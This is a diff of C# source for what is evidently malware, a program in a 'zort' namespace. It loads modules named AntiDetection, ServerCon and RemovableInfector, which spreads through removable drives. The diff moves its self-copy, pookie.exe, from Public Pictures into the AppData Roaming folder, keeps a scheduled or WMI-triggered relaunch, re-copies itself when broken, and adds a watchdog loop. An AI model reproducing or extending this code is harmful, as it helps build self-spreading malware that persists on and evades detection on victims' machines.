@@ -2,6 +2,7 @@
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
+using System.Threading;
 
 namespace zort
 {
@@ -9,11 +10,11 @@ namespace zort
     {
         readonly List<IPayloadModule> modules = new List<IPayloadModule>
                 {
+                    new AntiDetection(),
+                    new ServerCon(),
                     new RemovableInfector(),
                     //new ElevationHelper(),
                     //new ServiceManager(),
-                    new ServerCon(),
-                    new AntiDetection(),
                 };
 
         static void Main(string[] args)
@@ -23,19 +24,23 @@ namespace zort
 
             try
             {
+                string AppdataRoaming = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
+                string AppdataRoamingPookie = Path.Combine(AppdataRoaming, "Pookie");
+                string exePath = Path.Combine(AppdataRoamingPookie, "pookie.exe");
+                string selfPath = System.Reflection.Assembly.GetExecutingAssembly().Location;
+                bool isPookie = Path.GetFullPath(selfPath).Equals(Path.GetFullPath(exePath), StringComparison.OrdinalIgnoreCase);
+
                 RemovableInfector.CheckIfRunningFromRemovableDrive();
                 if (!RemovableInfector.IsSystemInfected())
                 {
-                    PersistenceHelper.CopyToPicturesAndScheduleRun();
+                    PersistenceHelper.CopyToTempAndScheduleRun();
                 }
                 else
                 {
                     //Check if the exe in Public Pictures is running
-                    string exePath = @"C:\\Users\\Public\\Pictures\\pookie.exe";
-                    string selfPath = System.Reflection.Assembly.GetExecutingAssembly().Location;
                     Console.WriteLine($"Self path: {selfPath}");
                     Console.WriteLine($"Exe path: {exePath}");
-                    if (Path.GetFullPath(selfPath).Equals(Path.GetFullPath(exePath), StringComparison.OrdinalIgnoreCase))
+                    if (isPookie)
                     {
                         Console.WriteLine("Infected file (me) is running.");
                     }
@@ -51,10 +56,10 @@ namespace zort
                                 var p = Process.Start(exePath);
                                 //check if it exits in 5 seconds
                                 p.WaitForExit(5000);
-                                if(p.HasExited)
+                                if (p.HasExited)
                                 {
                                     //exe is broken. recopy it and continue running from here.
-                                    PersistenceHelper.CopyToPicturesAndScheduleRun(true);
+                                    PersistenceHelper.CopyToTempAndScheduleRun(true);
                                     Console.WriteLine("Infected file is broken. Recopying it to Public Pictures.");
                                     goto payload;
                                 }
@@ -64,17 +69,34 @@ namespace zort
                         else
                         {
                             Console.WriteLine("No infected files found in Public Pictures.");
-                            PersistenceHelper.CopyToPicturesAndScheduleRun(true); //just copy and let the already existing wmi action to handle it.
+                            PersistenceHelper.CopyToTempAndScheduleRun(true); //just copy and let the already existing wmi action to handle it.
                         }
                     }
 
-                    payload:
+                payload:
                     var program = new Program();
                     program.InitModules();
                     //Console.WriteLine("Press any key to exit...");
-                    while (true)
+                    if(isPookie)
                     {
-                        Console.ReadLine();
+                        Thread.Sleep(Timeout.Infinite);
+                    } else
+                    {
+                        //check if pookie is running every 5 seconds
+                        while (true)
+                        {
+                            Thread.Sleep(5000);
+                            bool running = Process.GetProcessesByName("pookie").Length > 0;
+                            if (!running)
+                            {
+                                Console.WriteLine("Infected file is not running. Exiting.");
+                                Environment.Exit(0);
+                            }
+                            else
+                            {
+                                Console.WriteLine("Infected file is running.");
+                            }
+                        }
                     }
                 }
             }
@@ -83,20 +105,6 @@ namespace zort
                 File.AppendAllText("C:\\service-error.log", $"[{DateTime.Now}] ERROR: {ex}\n");
                 throw;
             }
-        }
-
-        protected void OnStop()
-        {
-            StopModules();
-        }
-
-        private void StopModules()
-        {
-            modules.ForEach(m =>
-            {
-                Console.WriteLine($"Stopping module {m.ModuleName}");
-                m.Stop();
-            });
         }
 
         private void InitModules()
